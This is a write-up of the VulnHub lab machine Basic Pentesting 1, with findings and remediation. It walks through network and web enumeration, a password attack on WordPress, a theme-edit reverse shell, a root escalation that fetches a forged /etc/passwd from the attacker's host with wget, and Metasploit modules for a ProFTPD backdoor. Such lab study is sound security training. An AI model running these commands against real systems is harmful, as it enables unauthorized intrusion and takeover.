# VulnHub — Basic Pentesting 1

> A detailed penetration-testing walkthrough covering reconnaissance, service enumeration, WordPress exploitation, privilege escalation, and multiple attack paths leading to root-level access.

---

## Table of Contents

* [Machine Information](#machine-information)
* [Objective](#objective)
* [Methodology](#methodology)
* [1. Host Discovery](#1-host-discovery)
* [2. Port and Service Enumeration](#2-port-and-service-enumeration)
* [3. Web Enumeration](#3-web-enumeration)
* [4. WordPress Enumeration](#4-wordpress-enumeration)
* [Attack Path 1 — WordPress to Root](#attack-path-1--wordpress-to-root)

  * [5. WordPress Administrator Access](#5-wordpress-administrator-access)
  * [6. Obtaining a Reverse Shell](#6-obtaining-a-reverse-shell)
  * [7. Local Enumeration](#7-local-enumeration)
  * [8. Privilege Escalation via Writable /etc/passwd](#8-privilege-escalation-via-writable-etcpasswd)
  * [9. Root Access Verification](#9-root-access-verification)
* [Attack Path 2 — ProFTPD Direct Root](#attack-path-2--proftpd-direct-root)
* [Attack Path 3 — WordPress Metasploit Shell Upload](#attack-path-3--wordpress-metasploit-shell-upload)
* [Attack Path Comparison](#attack-path-comparison)
* [Vulnerability Findings](#vulnerability-findings)
* [Remediation](#remediation)
* [Lessons Learned](#lessons-learned)
* [Conclusion](#conclusion)

---

## Machine Information

| Property        | Details                       |
| --------------- | ----------------------------- |
| Machine         | Basic Pentesting 1            |
| Platform        | VulnHub                       |
| Target IP       | `192.168.0.200`               |
| Attacker OS     | Kali Linux                    |
| Environment     | Local VirtualBox CTF          |
| Assessment Type | Black-box penetration testing |
| Final Objective | Obtain root-level access      |

> **Disclaimer:** This write-up was performed against an intentionally vulnerable CTF/lab machine in an authorized environment. The techniques described should only be used against systems for which you have explicit permission to test.

---

## Objective

The objective of this assessment was to identify vulnerabilities in the **Basic Pentesting 1** machine, obtain an initial foothold, perform privilege escalation where required, and ultimately demonstrate **root-level access**.

The assessment also explored alternative attack paths to understand the complete attack surface of the machine.

The documented attack paths are:

```text
                         Basic Pentesting 1
                                |
                +---------------+---------------+
                |               |               |
                v               v               v
          WordPress         ProFTPD        WordPress
                |          1.3.3c             |
                v               |              v
         admin:admin            |       Metasploit
                |               |       Shell Upload
                v               |              |
        Reverse Shell           |              v
                |               |            Shell
                v               |              
             www-data           |              
                |               |              
                v               |              
       Writable /etc/passwd     |              
                |               |              
                v               v              
               ROOT <-----------+              
```

---

# Methodology

The assessment followed a standard penetration-testing workflow:

1. Host Discovery
2. Port and Service Enumeration
3. Web Enumeration
4. WordPress Enumeration
5. Initial Access
6. Shell Stabilization
7. Local Enumeration
8. Privilege Escalation
9. Root Verification
10. Alternative Attack Paths
11. Vulnerability Analysis
12. Remediation

---

# 1. Host Discovery

The first step was to identify active hosts within the local network.

```bash
sudo nmap -sn 192.168.0.0/24
```

The scan identified the target machine:

```text
192.168.0.200
```

This IP address was subsequently used as the target for service enumeration.

---

# 2. Port and Service Enumeration

After identifying the target, an Nmap service/version scan was performed.

```bash
nmap -sV -sC -Pn 192.168.0.200
```

The scan identified three primary TCP services:

| Port     | Service | Version        | Relevance                          |
| -------- | ------- | -------------- | ---------------------------------- |
| `21/tcp` | FTP     | ProFTPD 1.3.3c | Potentially vulnerable FTP service |
| `22/tcp` | SSH     | OpenSSH 7.2p2  | Remote administration              |
| `80/tcp` | HTTP    | Apache 2.4.18  | Web application attack surface     |

The most notable findings were:

* **ProFTPD 1.3.3c** on TCP/21
* **Apache HTTP** on TCP/80
* A web application that required further enumeration

The ProFTPD version was particularly interesting because ProFTPD 1.3.3c is associated with a known backdoor command-execution vulnerability. Independent Basic Pentesting 1 write-ups also identify this service as a viable direct-root attack path.

---

# 3. Web Enumeration

The initial HTTP page did not reveal useful application information.

The next step was directory enumeration to identify hidden web content.

```bash
dirb http://192.168.0.200
```

The enumeration revealed:

```text
/secret/
```

Accessing `/secret/` revealed a **WordPress installation**.

Further recursive enumeration identified:

```text
/secret/wp-admin/
```

The discovery of a WordPress installation significantly expanded the web attack surface because it provided an additional application layer to enumerate and test.

Independent Basic Pentesting 1 research also documents `/secret/` as the hidden WordPress directory.

---

# 4. WordPress Enumeration

WPScan was used to enumerate WordPress users.

```bash
wpscan --url http://192.168.0.200/secret/ -e u
```

The enumeration identified the WordPress user:

```text
admin
```

A password attack was then performed against the discovered account using:

```bash
wpscan --url http://192.168.0.200/secret/ -U admin -P /usr/share/wordlists/dirb/common.txt
```

The credentials identified in the assessment were:

```text
Username: admin
Password: admin
```

This represents a **weak/default credential vulnerability**.

The credentials provided access to the WordPress administrator interface.

---

# Attack Path 1 — WordPress to Root

This was the primary end-to-end attack path documented during the assessment.

```text
WordPress
    |
    v
admin:admin
    |
    v
WordPress Administrator
    |
    v
PHP Code Execution
    |
    v
Reverse Shell
    |
    v
www-data
    |
    v
Writable /etc/passwd
    |
    v
Privilege Escalation
    |
    v
ROOT
```

---

# 5. WordPress Administrator Access

Using the discovered credentials:

```text
admin:admin
```

access to the WordPress administrator interface was obtained.

The installed theme identified during the assessment was:

```text
Twenty Seventeen
```

Administrative access was significant because WordPress administrators with the ability to modify executable PHP theme files can potentially turn application-level access into operating-system command execution.

The attack therefore moved from:

```text
Valid WordPress Credentials
        ↓
Administrator Access
        ↓
PHP Code Modification
        ↓
Remote Code Execution
```

---

# 6. Obtaining a Reverse Shell

The WordPress theme functionality was used to modify executable PHP content and introduce a reverse-shell mechanism.

After triggering the modified PHP resource, a shell was obtained on the target.

The initial shell operated as:

```text
www-data
```

The shell was then upgraded to a more interactive terminal:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

The account was verified using:

```bash
whoami
```

Result:

```text
www-data
```

The hostname was also checked:

```bash
hostname
```

Result:

```text
vtcsec
```

At this stage, the machine had been compromised at the application/web-server level, but **root privileges had not yet been obtained**.

---

# 7. Local Enumeration

After obtaining the `www-data` shell, local enumeration was performed to identify possible privilege-escalation opportunities.

The system password database was examined:

```bash
cat /etc/passwd
```

The root account was identified:

```text
root:x:0:0:root:/root:/bin/bash
```

The important values are:

| Field    | Value       | Meaning               |
| -------- | ----------- | --------------------- |
| Username | `root`      | Root account          |
| UID      | `0`         | Root-level privileges |
| GID      | `0`         | Root group            |
| Home     | `/root`     | Root home directory   |
| Shell    | `/bin/bash` | Login shell           |

During enumeration, the important weakness was that the `/etc/passwd` file was writable/modifiable from the compromised context.

This represented a critical local privilege-escalation opportunity.

---

# 8. Privilege Escalation via Writable `/etc/passwd`

## Vulnerability Overview

The `/etc/passwd` file contains local account information.

Historically, password hashes could also be stored directly in this file. More importantly for this attack, Linux associates **UID `0` with root-level privileges**.

If an attacker can manipulate account information in `/etc/passwd`, they may be able to create or modify an account associated with UID `0`.

The original root entry was:

```text
root:x:0:0:root:/root:/bin/bash
```

A password hash was generated using:

```bash
openssl passwd
```

The generated hash was then incorporated into the modified passwd file.

The modified file was transferred to the target using a temporary Python HTTP server:

```bash
python -m http.server 80
```

The target retrieved the file using:

```bash
wget http://192.168.0.115/passwords.txt
```

The modified passwd database was then used to replace the vulnerable system file, as documented during the assessment.

The result was that the attacker could authenticate with root-level privileges.

---

# 9. Root Access Verification

Root-level access was successfully obtained.

The resulting shell prompt was:

```text
root@vtcsec:/tmp#
```

This demonstrates that the privilege-escalation stage succeeded.

The final state of the primary attack path was therefore:

```text
WordPress Administrator
        ↓
Reverse Shell
        ↓
www-data
        ↓
Writable /etc/passwd
        ↓
Privilege Escalation
        ↓
UID 0
        ↓
ROOT
```

### Final Result

**Full root-level compromise was achieved.**

No flag file was present in the `/root` directory shown in the supplied assessment evidence. Therefore, for this particular VM instance, the demonstrated completion criterion is treated as **successful root access**, unless the specific VM distribution/documentation defines an additional flag.

---

# Attack Path 2 — ProFTPD Direct Root

The second route provides a significantly shorter path to root.

Unlike the primary WordPress route, this attack does not require obtaining a WordPress shell first.

## 10. Vulnerable FTP Service

The initial Nmap scan identified:

```text
21/tcp open ftp ProFTPD 1.3.3c
```

Because the version was known to be potentially vulnerable, Exploit-DB information was searched using:

```bash
searchsploit ProFTPD 1.3.3c
```

The relevant result identified:

```text
ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution
```

The corresponding Exploit-DB reference is:

https://www.exploit-db.com/exploits/15662

The existence of this vulnerability is independently documented by multiple Basic Pentesting 1 walkthroughs.

---

## 11. Metasploit Exploitation

The Metasploit module documented in the assessment was:

```text
modules/exploits/unix/ftp/proftpd_133c_backdoor.rb
```

The configured parameters included:

```text
RHOST = 192.168.0.200
LHOST = 192.168.0.15
```

A reverse command payload was selected.

After exploitation, the assessment obtained a Meterpreter/root-level session.

The resulting attack chain was:

```text
TCP/21
   ↓
ProFTPD 1.3.3c
   ↓
Known Backdoor
   ↓
Remote Code Execution
   ↓
Root
```

### Security Significance

This represents a **direct compromise path** because the vulnerable FTP service can provide root-level access without first compromising WordPress.

This is why service-version enumeration is critical during penetration testing.

---

# Attack Path 3 — WordPress Metasploit Shell Upload

A third route was identified using the WordPress administrator credentials.

This is separate from manually editing the WordPress theme.

## 12. WP Admin Shell Upload

The Metasploit module documented in the assessment was:

```text
exploit/unix/webapp/wp_admin_shell_upload
```

The relevant configuration was:

```text
RHOST      192.168.0.200
TARGETURI  /secret
USERNAME   admin
PASSWORD   admin
```

The attack chain is:

```text
WordPress
    ↓
admin:admin
    ↓
WordPress Administrator
    ↓
wp_admin_shell_upload
    ↓
PHP Shell Upload
    ↓
Command Execution
    ↓
Shell Access
```

This demonstrates that the WordPress administrative credentials represented a meaningful security boundary failure.

Independent Basic Pentesting 1 walkthroughs also document the `wp_admin_shell_upload` route as an alternative way to obtain a shell from the WordPress installation.

---

# Attack Path Comparison

| Attack Path                       | Initial Access                          | Privilege Escalation       | Result           |
| --------------------------------- | --------------------------------------- | -------------------------- | ---------------- |
| **Path 1 — WordPress Manual**     | `admin:admin` → PHP reverse shell       | Writable `/etc/passwd`     | **Root**         |
| **Path 2 — ProFTPD**              | ProFTPD 1.3.3c backdoor                 | Not required               | **Root**         |
| **Path 3 — WordPress Metasploit** | `admin:admin` → `wp_admin_shell_upload` | Depends on resulting shell | **Shell access** |

### Key Observation

The machine contains **multiple independent attack opportunities**.

The most direct route to root is the vulnerable ProFTPD service, while the WordPress path demonstrates how weak application credentials can be chained with insecure PHP execution and local privilege escalation.

---

# Vulnerability Findings

## Finding 1 — ProFTPD 1.3.3c Backdoor RCE

**Severity:** Critical

**Affected Service:** FTP — TCP/21

### Description

The target was running ProFTPD 1.3.3c, a version associated with a known backdoor command-execution vulnerability.

### Evidence

```text
21/tcp open ftp ProFTPD 1.3.3c
```

The vulnerability was identified using:

```bash
searchsploit ProFTPD 1.3.3c
```

### Impact

Successful exploitation can result in remote command execution and, in the vulnerable configuration represented by this CTF, direct root-level compromise.

### Remediation

* Upgrade to a supported ProFTPD release.
* Remove the vulnerable version.
* Disable FTP if it is not required.
* Restrict FTP access through firewall rules.
* Monitor exposed services and service versions.

---

## Finding 2 — Weak WordPress Credentials

**Severity:** High

**Affected Component:** WordPress `/secret/`

### Description

The WordPress administrator account was accessible using:

```text
admin:admin
```

### Impact

Administrative access allowed the attacker to interact with privileged WordPress functionality and ultimately obtain operating-system-level command execution.

### Remediation

* Replace default credentials.
* Enforce strong passwords.
* Enable MFA for administrative accounts.
* Implement account lockout/rate limiting.
* Remove unnecessary administrator accounts.
* Apply least privilege.

---

## Finding 3 — WordPress Administrative PHP Code Execution

**Severity:** Critical

**Affected Component:** WordPress administration / theme functionality

### Description

Administrative access permitted modification of executable PHP theme content.

### Impact

An attacker with administrator credentials could convert WordPress-level access into a server-side shell running as the web-server account.

### Remediation

* Restrict administrator privileges.
* Disable theme/plugin file editing where unnecessary.
* Keep WordPress and themes updated.
* Apply least privilege.
* Monitor modifications to PHP files.
* Separate content-management privileges from server-level privileges.

---

## Finding 4 — Writable `/etc/passwd`

**Severity:** Critical

**Affected Component:** Linux authentication configuration

### Description

The compromised `www-data` context was able to modify `/etc/passwd`.

### Impact

An attacker could manipulate local account information and obtain UID `0` privileges, resulting in complete host compromise.

### Remediation

* Restore secure ownership and permissions on `/etc/passwd`.
* Prevent unprivileged users from modifying authentication files.
* Audit sensitive file permissions.
* Monitor changes to `/etc/passwd`.
* Apply operating-system hardening and least privilege.

---

# Attack Surface Summary

| Component       | Weakness                | Impact                            |
| --------------- | ----------------------- | --------------------------------- |
| FTP             | ProFTPD 1.3.3c backdoor | Direct remote code execution/root |
| WordPress       | Weak credentials        | Administrative compromise         |
| WordPress Admin | PHP code modification   | Web-server command execution      |
| Linux           | Writable `/etc/passwd`  | Root privilege escalation         |

---

# Remediation

## FTP

* Upgrade or remove ProFTPD 1.3.3c.
* Disable FTP where unnecessary.
* Restrict access to trusted networks.
* Monitor exposed services.
* Use secure alternatives where appropriate.

## WordPress

* Replace weak/default credentials immediately.
* Enforce strong authentication.
* Enable MFA.
* Keep WordPress core, themes, and plugins updated.
* Restrict administrative privileges.
* Disable unnecessary theme/plugin code editing.
* Monitor administrative activity.

## Linux

* Protect `/etc/passwd` from unauthorized modification.
* Verify ownership and permissions of sensitive authentication files.
* Apply least privilege.
* Regularly audit local privilege-escalation opportunities.
* Keep the operating system patched.

## Network

* Restrict unnecessary exposed ports.
* Use host-based and network firewalls.
* Segment administrative services.
* Restrict SSH and FTP access.
* Continuously monitor externally exposed services.

---

# Lessons Learned

This machine demonstrates several important penetration-testing principles:

1. **Enumeration is fundamental.**
   A simple service scan revealed multiple possible attack surfaces.

2. **Service versions matter.**
   Identifying `ProFTPD 1.3.3c` immediately provided a potential direct compromise route.

3. **Web enumeration should go beyond the homepage.**
   The initial web page revealed little, while directory enumeration exposed `/secret/`.

4. **Hidden applications can significantly expand attack surface.**
   The `/secret/` directory contained a complete WordPress installation.

5. **Weak credentials can lead to complete compromise.**
   `admin:admin` provided access to privileged WordPress functionality.

6. **Initial access and privilege escalation are separate stages.**
   The WordPress reverse shell initially provided `www-data`, not root.

7. **Local enumeration is essential after obtaining a shell.**
   Examination of `/etc/passwd` exposed the critical privilege-escalation opportunity.

8. **Multiple attack paths may exist on the same machine.**
   Basic Pentesting 1 provides both a WordPress-based route and a direct ProFTPD route.

9. **Root access should always be verified.**
   The final shell demonstrated successful UID 0 access.

---

# Final Attack Chain

## Primary Path

```text
Host Discovery
      ↓
Nmap Service Enumeration
      ↓
HTTP / Apache
      ↓
Directory Enumeration
      ↓
/secret/
      ↓
WordPress
      ↓
WPScan
      ↓
admin:admin
      ↓
WordPress Administrator
      ↓
PHP Reverse Shell
      ↓
www-data
      ↓
Local Enumeration
      ↓
Writable /etc/passwd
      ↓
Privilege Escalation
      ↓
ROOT
```

## Alternative Path 1

```text
Nmap
  ↓
TCP/21
  ↓
ProFTPD 1.3.3c
  ↓
Known Backdoor RCE
  ↓
ROOT
```

## Alternative Path 2

```text
WordPress
  ↓
admin:admin
  ↓
WordPress Administrator
  ↓
wp_admin_shell_upload
  ↓
Shell Access
```

---

# Conclusion

The **Basic Pentesting 1** machine demonstrates how multiple weaknesses can coexist and provide several routes toward complete system compromise.

The primary documented attack path began with web enumeration and discovery of a hidden WordPress installation. Weak administrator credentials provided access to WordPress, which was then leveraged to obtain a `www-data` shell. Local enumeration identified an insecurely writable `/etc/passwd`, allowing privilege escalation to root.

Two additional attack paths were also identified:

* **ProFTPD 1.3.3c backdoor → direct root access**
* **WordPress administrator → Metasploit `wp_admin_shell_upload` → shell access**

The most important lesson is that penetration testing is not simply about finding one vulnerability. Effective assessment requires systematic enumeration, understanding how vulnerabilities can be chained, validating alternative attack paths, and documenting both the technical impact and appropriate remediation.

**Final assessment result: Root-level compromise successfully demonstrated.**

---

## Tools Used

| Tool           | Purpose                                           |
| -------------- | ------------------------------------------------- |
| `nmap`         | Host discovery and service enumeration            |
| `dirb`         | Web directory enumeration                         |
| `wpscan`       | WordPress user enumeration and credential testing |
| `searchsploit` | Local Exploit-DB vulnerability research           |
| `msfconsole`   | Exploitation and shell acquisition                |
| `python`       | Shell stabilization / temporary HTTP server       |
| `openssl`      | Password hash generation                          |
| `wget`         | File retrieval during the lab exercise            |

---

> **CTF Status: Root Access Achieved**
>
> **Environment: Authorized Vulnerable Lab**
>
> **Primary Skills Demonstrated: Reconnaissance · Enumeration · Web Exploitation · Initial Access · Privilege Escalation · Vulnerability Analysis**
